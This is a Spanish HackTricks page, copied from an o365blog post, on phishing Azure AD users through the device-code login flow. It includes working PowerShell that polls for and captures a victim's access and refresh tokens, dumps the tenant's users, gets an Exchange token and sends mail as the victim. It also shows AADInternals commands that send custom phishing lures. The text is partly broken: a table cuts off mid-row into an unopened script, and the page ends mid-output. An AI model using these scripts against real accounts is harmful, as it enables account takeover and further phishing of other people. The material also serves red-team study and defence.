# Az - Phishing de autenticación de código de dispositivo

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

**Este post fue copiado de** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/)

### ¿Qué es la autenticación de código de dispositivo? <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

Según la [documentación](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code) de Microsoft, la autenticación de código de dispositivo:

> permite a los usuarios iniciar sesión en dispositivos con restricciones de entrada, como un televisor inteligente, un dispositivo IoT o una impresora. Para habilitar este flujo, el dispositivo hace que el usuario visite una página web en su navegador en otro dispositivo para iniciar sesión. Una vez que el usuario inicia sesión, el dispositivo puede obtener tokens de acceso y tokens de actualización según sea necesario.

El proceso es el siguiente:

1. Un usuario inicia una aplicación que admite el flujo de código de dispositivo en un dispositivo.
2. La aplicación se conecta al punto final /devicecode de Azure AD y envía **client\_id** y **resource**.
3. Azure AD envía de vuelta **device\_code**, **user\_code** y **verification\_url**.
4. El dispositivo muestra la **verification\_url** (hxxps://microsoft.com/devicelogin) y el **user\_code** al usuario.
5. El usuario abre un navegador y navega hasta **verification\_url**, proporciona el **user\_code** cuando se le solicita e inicia sesión.
6. El dispositivo sondea a Azure AD hasta que después de un inicio de sesión exitoso obtiene **access\_token** y **refresh\_token**.

![Flujo de código de dispositivo](https://o365blog.com/images/posts/phishing\_5.png)

### Phishing con autenticación de código de dispositivo <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

La idea básica para utilizar la autenticación de código de dispositivo para phishing es la siguiente.

1. Un atacante se conecta al punto final /devicecode y envía **client\_id** y **resource**.
2. Después de recibir **verification\_uri** y **user\_code**, crea un correo electrónico que contenga un enlace a **verification\_uri** y **user\_code**, y lo envía a la víctima.
3. La víctima hace clic en el enlace, proporciona el código y completa el inicio de sesión.
4. El atacante recibe **access\_token** y **refresh\_token** y ahora puede imitar a la víctima.

#### 1. Conexión al punto final /devicecode <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

El primer paso es hacer un POST http al punto final de código de dispositivo de Azure AD:

```
 https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```

Estoy usando los siguientes parámetros. Elegí usar el client\_id de "Microsoft Office" porque parece el nombre de la aplicación más legítimo, y también se puede usar para acceder a otros recursos. El recurso elegido da acceso a la API de gráficos de AAD que es utilizada por el módulo PowerShell de MSOnline.

| Parámetro  | Valor                                                   |
| ---------- | ------------------------------------------------------- |
| client\_id | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
|
# Crear cuerpo para solicitudes de autenticación

$body=@{
	"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
	"code" =       $authResponse.device_code
	"resource" =   "https://graph.windows.net"
}

# Bucle mientras la autorización está pendiente o hasta que se exceda el tiempo de espera

while($continue)
{
	Start-Sleep -Seconds $interval
	$total += $interval

	if($total -gt $expires)
	{
		Write-Error "Se ha producido un tiempo de espera"
		return
	}
				
	# Intentar obtener la respuesta. Devolverá 40x mientras esté pendiente, por lo que necesitamos intentar y capturar

	try
	{
		$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
	}
	catch
	{
		# Este es el flujo normal, siempre devuelve 40x a menos que tenga éxito

		$details=$_.ErrorDetails.Message | ConvertFrom-Json
		$continue = $details.error -eq "authorization_pending"
		Write-Host $details.error

		if(!$continue)
		{
			# No está pendiente, por lo que este es un error real

			Write-Error $details.error_description
			return
		}
	}

	# Si obtenemos una respuesta, todo está bien!

	if($response)
	{
		break # Salir del bucle

	}
}
```

Ahora podemos usar el token de acceso para suplantar al usuario:

```powershell
# Volcar los usuarios del inquilino en csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```

También podemos obtener tokens de acceso para otros servicios utilizando el token de actualización siempre que el client\_id siga siendo el mismo.

El siguiente script obtiene un token de acceso para Exchange Online.

```powershell
# Crear cuerpo para obtener token de acceso para Exchange Online

$body=@{
	"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"grant_type" =    "refresh_token"
	"scope" =         "openid"
	"resource" =      "https://outlook.office365.com"
	"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Enviar correo electrónico como la víctima

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "otra.victima@objetivo.org" -Subject "Pago vencido" -Message "Paga esto <h2>lo antes posible!</h2>"
```

## Uso de AADInternals para phishing <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternals (v0.4.4 o posterior) tiene una función [Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing) que automatiza el proceso de phishing.

El mensaje de phishing se puede personalizar, el mensaje predeterminado es el siguiente:

```
'<div>¡Hola!<br/>Este es un mensaje enviado por alguien que está utilizando la función de phishing de <a href="https://o365blog.com/aadinternals">AADInternals</a>. <br/><br/>Aquí hay un <a href="{1}">enlace</a> al que <b>no debes hacer clic</b>.<br/><br/>Si aún decides hacerlo, proporciona el siguiente código cuando se solicite: <b>{0}</b>.</div>'
```

Mensaje predeterminado en el correo electrónico:\
![Correo electrónico de phishing](https://o365blog.com/images/posts/phishing\_11.png)

Mensaje predeterminado en Teams:\
![Mensaje de phishing](https://o365blog.com/images/posts/phishing\_12.png)

### Correo electrónico <a href="#email" id="email"></a>

El siguiente ejemplo envía un correo electrónico de phishing utilizando un mensaje personalizado. Los tokens se guardan en la caché.

```powershell
# Crear un mensaje personalizado

$message = '<html>¡Hola!<br/>Aquí está el enlace al <a href="{1}">documento</a>. Utiliza el siguiente código para acceder: <b>{0}</b>.</html>'

# Enviar un correo electrónico de phishing a los destinatarios utilizando un mensaje personalizado y guardar los tokens en caché

Invoke-AADPhishing -Recipients "victima@empresa.com","victima2@empresa.com" -Subject "Johnny compartió un documento contigo" -Sender "Johnny Carson <jc@algundonde.com>" -SMTPServer smtp.miservidor.local -Message $message -SaveToCache 
```

```
Código: CKDZ2BURF
Correo electrónico enviado a